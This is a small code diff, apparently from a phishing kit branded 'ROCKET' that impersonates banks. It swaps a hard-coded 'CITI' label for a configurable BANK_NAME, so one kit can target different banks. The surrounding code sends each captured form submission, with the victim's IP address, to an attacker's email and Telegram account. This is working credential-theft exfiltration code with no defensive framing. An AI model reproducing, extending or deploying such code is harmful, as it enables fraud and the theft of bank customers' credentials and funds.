@@ -63,14 +63,14 @@ ${
     if (process.env.TO) {
       await sendEmail(
         message,
-        `CITI - ${values.form} by ROCKET 🚀🚀🚀 From ${ip}`
+        `${process.env.BANK_NAME} - ${values.form} by ROCKET 🚀🚀🚀 From ${ip}`
       );
     }
 
     if (process.env.TELEGRAM_ID) {
       await sendTelegram({
         message: `
-        CITI - ${values.form} by ROCKET 🚀🚀🚀 From ${ip}
+        ${process.env.BANK_NAME} - ${values.form} by ROCKET 🚀🚀🚀 From ${ip}
         ${message}
       `,
       });
